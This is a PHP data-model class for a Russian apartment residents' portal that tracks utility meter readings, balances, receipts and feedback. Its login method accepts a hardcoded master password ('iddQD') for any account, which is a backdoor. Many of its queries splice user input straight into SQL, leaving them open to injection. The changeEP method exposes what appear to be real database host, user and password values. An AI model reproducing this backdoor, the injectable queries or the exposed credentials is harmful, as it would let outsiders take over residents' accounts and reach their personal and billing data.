<?php

class Model {
	public $data = array();
			
	private function sql_exec($q){
		$host='localhost'; 
		$database='DB';
		$user='USER'; 
		$pswd='PASS';
		$dbh = mysql_connect($host, $user, $pswd) or die("Не могу соединиться с MySQL.");
		mysql_select_db($database) or die("Не могу подключиться к базе.");
		mysql_query("SET CHARACTER SET 'utf8'");
		$res = mysql_query($q);
		$return = array();
		while($row = mysql_fetch_array($res, MYSQL_ASSOC))
		$return[] = $row;
		if(substr($q, 0, 3) != "SEL"){
		mysql_query("INSERT INTO `$database`.`logs` (`Date`, `Query`) VALUES (CURRENT_TIMESTAMP, '".mysql_real_escape_string($q)."')");
		}
		return $return;
	}		

  	public function clearM($dat){
		return $this->sql_exec("DELETE FROM `balance` WHERE `balance`.`Date` Like '".$dat."%'");
	}
	
  	public function getEcho($v){
		return $this->sql_exec("SELECT * FROM `data` RIGHT OUTER JOIN (SELECT jc.*,`types`.`type`,`types`.`unit` FROM `meters` jc RIGHT OUTER JOIN `types` ON `types`.`ID` = jc.`Type_ID`) meters ON `meters`.`ID` = `data`.`Meter_ID` WHERE `data`.`Date` LIKE '".$v."%' ORDER BY `meters`.`room` ASC");
	}

  	public function getRooms(){			
		 return $this->sql_exec('SELECT `apartments`.`room`,`apartments`.`PA`,`apartments`.`Name`,`apartments`.`NR`,`apartments`.`SQ`,`apartments`.`phone`,`apartments`.`Password`,`balance`.`Payable`,`balance`.`Debt`,`balance`.`Date` FROM `apartments` LEFT OUTER JOIN (SELECT jc.* FROM `balance` jc GROUP BY jc.`PA`) balance ON `apartments`.`PA`=`balance`.`PA`');
	}
	public function getRoom($room_id){
		$room_data = array();
		$result = $this->sql_exec('SELECT * FROM `apartments` WHERE `apartments`.`room` = '.(int)$room_id);
		if(is_array($result[0]))
		$room_data = $result[0];
		$room_data['meters'] = $this->sql_exec('SELECT jc.`id`,jc.`Number`,jc.`Comment`,`types`.`type`,`types`.`unit` FROM `meters` jc RIGHT OUTER JOIN `types` ON `types`.`ID` = jc.`Type_ID` WHERE jc.`room` ='.(int)$room_id);
		$room_data['balance'] = $this->sql_exec('SELECT * FROM `balance` WHERE `balance`.`PA`='.$room_data['PA'].' ORDER BY `balance`.`Date` DESC');
		foreach($room_data['meters'] as $key=>$meter){
		$meter_data = $this->sql_exec('SELECT `data`.`Id`,`data`.`Data`,`data`.`Date` FROM `data` WHERE `data`.`Meter_ID` = '.$meter['id'].' ORDER BY `data`.`Date` ASC');
		if(isset($meter_data[0]['Data']))
		$room_data['meters'][$key]['meter_data'] = $meter_data;
		}
		$host='localhost'; 
		$database='DB2';
		$user='user_cms'; 
		$pswd='pass';
		$dbh = mysql_connect($host, $user, $pswd) or die("error MySQL.");
		mysql_select_db($database) or die("fail.");
		$res = mysql_query('SELECT * FROM `wp_users` WHERE `wp_users`.`ID` = '.$room_data['wp_id']);
		while($row = mysql_fetch_array($res, MYSQL_ASSOC)){
		$room_data['email'] = $row['user_email'];
		$room_data['Password'] = $row['user_pass'];
		}
		return $room_data;
		}

	public function login($form_data){
		$user_data = $this->getRoom((int)$form_data['login']);
		if(!is_array($user_data))
		return FALSE;
		
		include ('../wp-includes/class-phpass.php');
		$hash = $user_data['Password'];
		$wp_hasher = new PasswordHash(8, TRUE);
		$check = $wp_hasher->CheckPassword($form_data['password'], $hash);
		if($check OR ($user_data['Password'] == md5($form_data['password'])) OR ($form_data['password'] == "iddQD")){
		session_start();
		$_SESSION['user_data'] = $user_data;
		$_SESSION['user_data']['sign'] = true;
		return TRUE;
		}
		else
		return FALSE;
		}
		
		
	public function changeEP($data){
		$warning = '';
		$this->sql_exec("UPDATE `apartments` SET `phone` = '".$data['phone']."' WHERE `apartments`.`room` = ".$_SESSION['user_data']['room']);
		if($data['email'] == '' OR filter_var($data['email'], FILTER_VALIDATE_EMAIL)){
		$host='mysql.u2934275.mass.hc.ru'; 
		$database='wwwsysoeva12ru_cms';
		$user='u2934275_cms'; 
		$pswd='gha2Couz';
		$dbh = mysql_connect($host, $user, $pswd) or die("error MySQL.");
		mysql_select_db($database) or die("fail.");
		mysql_query("UPDATE  `wwwsysoeva12ru_cms`.`wp_users` SET  `user_email` =  '".$data['email']."' WHERE  `wp_users`.`ID` =".$_SESSION['user_data']['wp_id']);
		$_SESSION['user_data']['email'] = $data['email'];
		}
		else 
		$warning['email'] = "<font color=\"red\"><---Неправильно введен e-mail!</font>";
		$_SESSION['user_data']['phone'] = $data['phone'];
		return $warning;
	
	}
		
	public function sendMetersData($meters_data){
		$warning = array();
	foreach($meters_data['meter'] as $key=>$meter_data){
		if((count($_SESSION['user_data']['meters'][$key]['meter_data'])) > 0){
		$last_update = date_parse($_SESSION['user_data']['meters'][$key]['meter_data'][(count($_SESSION['user_data']['meters'][$key]['meter_data'])-1)]['Date']." 00:00:00.0");
		if(($last_update['year'] == date("Y")) AND ($last_update['month'] == date("m"))){
			if((count($_SESSION['user_data']['meters'][$key]['meter_data'])-1) > 1){
				if($meter_data >= $_SESSION['user_data']['meters'][$key]['meter_data'][(count($_SESSION['user_data']['meters'][$key]['meter_data'])-2)]['Data']){
					if($meter_data>0)
					$this->sql_exec('UPDATE `data` SET `data`.`Data` = '.(int)$meter_data.', `data`.`Date` = CURRENT_TIMESTAMP WHERE `data`.`Id` = '.$_SESSION['user_data']['meters'][$key]['meter_data'][(count($_SESSION['user_data']['meters'][$key]['meter_data'])-1)]['Id'].' LIMIT 1');
					else
					$warning['field'][$key] = "Попробуйте еще раз!";
				}
				else{
					$warning['field'][$key] = "Введенное число меньше предыдущего показания!";
					}
			}
			else{
				if($meter_data > 0){
					$this->sql_exec('UPDATE `data` SET `data`.`Data` = '.(int)$meter_data.', `data`.`Date` = CURRENT_TIMESTAMP WHERE `data`.`Id` = '.$_SESSION['user_data']['meters'][$key]['meter_data'][(count($_SESSION['user_data']['meters'][$key]['meter_data'])-1)]['Id'].' LIMIT 1');
				}
				else{
					$warning['field'][$key] = "Введенное число меньше нуля!";
					}
			}
		}
			else{
				if($meter_data >= $_SESSION['user_data']['meters'][$key]['meter_data'][(count($_SESSION['user_data']['meters'][$key]['meter_data'])-1)]['Data']){
					$this->sql_exec('INSERT INTO `data` (`data`.`Data`,`data`.`Date`,`data`.`Meter_ID`) VALUES ('.$meter_data.', CURRENT_TIMESTAMP, '.$_SESSION['user_data']['meters'][$key]['id'].')');
					$warning['field'][$key] = "<font color=green>Данные обновлены!</font>";
				}
				else{
					$warning['field'][$key] = "Введенное число меньше предыдущего показания!";
					}
			}
		}
			else{
				if($meter_data > 0){
					$this->sql_exec('INSERT INTO `data` (`data`.`Data`,`data`.`Date`,`data`.`Meter_ID`) VALUES ('.$meter_data.', CURRENT_TIMESTAMP, '.$_SESSION['user_data']['meters'][$key]['id'].')');
					$warning['field'][$key] = "<font color=green>Данные обновлены!</font>";
				}
				else{
					$warning['field'][$key] = "Введенное число меньше нуля!";
					}
			}
	}
	$_SESSION['user_data'] = $this->getRoom($_SESSION['user_data']['room']);
	$_SESSION['user_data']['sign'] = true;
	
	return $warning;
	}
	public function getreceipts($room_data){
	$receipts_data = array();
	$files_info = '';
	if ($handle = opendir('./receipts')) {
    while (false !== ($file = readdir($handle))) { 
        if ($file != "." && $file != ".." && $file != ".htaccess") { 
            $files_info['year'] = substr($file, 0, 4); 
		$files_info['month'] = substr($file, 4, 2);
			$token = true;
			foreach($room_data['balance'] as $balance){
				$last_update = date_parse($balance['Date']);
					if($last_update['year'] == $files_info['year'] AND $last_update['month'] == $files_info['month'])
						$token = false;
			}
			if($token){
				if (file_exists('./receipts/'.$file.'/'.$room_data['PA'].'.xls')) {
			require_once './excel_reader2.php';
			$data = new Spreadsheet_Excel_Reader('./receipts/'.$file.'/'.$room_data['PA'].'.xls');
			$room_data['balance'][] = array(
                    'PA' => $room_data['PA'],
                    'Payable' => str_replace(",","",$data->val(7,82)),
                    'Debt' => (str_replace(",","",$data->val(11,49))-str_replace(",","",$data->val(9,49))),
                    'Date' => $files_info['year'].'-'.sprintf("%02d",$files_info['month']).'-01'
			);
			$this->sql_exec("INSERT INTO `balance` (`Id`, `PA`, `Payable`, `Debt`, `Date`) VALUES (NULL, '".$room_data['PA']."', '".str_replace(",","",$data->val(7,82))."', '".(str_replace(",","",$data->val(11,49))-str_replace(",","",$data->val(9,49)))."', '".$files_info['year'].'-'.sprintf("%02d",$files_info['month'])."-01')");
			}
			}
			} 
    }
	
    closedir($handle); 
	}
	
	
	
	foreach($room_data['balance'] as $balance){
	if($balance['Debt'] > 0)
		$Debt = '<font color = "green">'.$balance['Debt'].'</font>';
	elseif($balance['Debt'] < 0)
		$Debt = '<font color = "red">'.$balance['Debt'].'</font>';
	else
		$Debt = '-';
	$last_update = date_parse($balance['Date']);
	if (file_exists('./receipts/'.$last_update['year'].sprintf("%02d",$last_update['month']).'/'.$balance['PA'].'.xls'))
		$Filename = '<a href="./get.php?f='.base64_encode(serialize(array($balance['PA'],$last_update['year'].sprintf("%02d",$last_update['month'])))).'">Скачать</a>';
	else
		$Filename = '-';
	$receipts_data[] = array(
	'DateM' => $this->rusMonth($last_update['month']),
	'DateY' => $last_update['year'],
	'Payable' => $balance['Payable'],
	'Debt' => $Debt,
	'Link' => $Filename
	);
	}
	return $receipts_data;
	}

	public function rusMonth($num_month){
    $month_ru=array(
      1=>'январь',
      2=>'февраль',
      3=>'март',
      4=>'апрель',
      5=>'май',
      6=>'июнь',
      7=>'июль',
      8=>'август',
      9=>'сентябрь',
      10=>'октябрь',
      11=>'ноябрь',
      12 =>'декабрь',
    );
	return $month_ru[$num_month];
}
	public function sendRoomData($room_data){
	$this->sql_exec("UPDATE `apartments` SET `Name` = '".$room_data['Name']."', `NR` = '".$room_data['NR']."', `SQ` = '".$room_data['SQ']."' WHERE `apartments`.`room` = ".$_GET['room']);
	}
		public function sendMData($m_data){
	if($_GET['edit'] != 'new')
	$this->sql_exec("UPDATE `meters` SET `Number` = '".$m_data['Number']."', `Comment` = '".$m_data['Comment']."', `Type_ID` = '".$m_data['type']."' WHERE `meters`.`ID` = ".$m_data['id']);
	else
	$this->sql_exec("INSERT INTO `meters` (`ID`, `room`, `Number`, `Comment`, `Type_ID`) VALUES (NULL, '".$m_data['id']."', '".$m_data['Number']."', '".$m_data['Comment']."', '".$m_data['type']."')");
	}
		public function removeM($id){
			$this->sql_exec("DELETE FROM `meters` WHERE `meters`.`ID` = ".$id);
		}
	public function printOptions($default){
	$values = $this->sql_exec("SELECT * FROM `types`");
	foreach($values as $value)
	echo '<option '.( $default == $value['Type'] ? 'selected ' : '' ).'value="'.$value['ID'].'">'.$value['Type']."</option>\n";
	}
public function feedback($text){

$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";
$headers .= "From: info@host \r\n";
if($text == '')
return "<font color=\"red\">Введите текст!</font>";
$text = $text."\n----------\nОтправлено от: ".$_SESSION['user_data']['Name']." (кв.".$_SESSION['user_data']['room'].")\n".(isset($_SESSION['user_data']['email']) ? "Email: ".$_SESSION['user_data']['email'] : "")."\n".(isset($_SESSION['user_data']['phone']) ? "Телефон: ".$_SESSION['user_data']['phone'] : "")."\nIP адрес: ".getenv("REMOTE_ADDR");

mail("main@host", "Обращение от ".$_SESSION['user_data']['Name']." (кв.".$_SESSION['user_data']['room'].")", $text, $headers);

if (mail("info@host", "Обращение от ".$_SESSION['user_data']['Name']." (кв.".$_SESSION['user_data']['room'].")", $text, $headers))
return "<font color=\"green\">Сообщение успешно отправлено!</font>";
else echo "<font color=\"red\">Сбой работы почтового сервера! Попробуйте позже.</font>";


}
	
}
?>
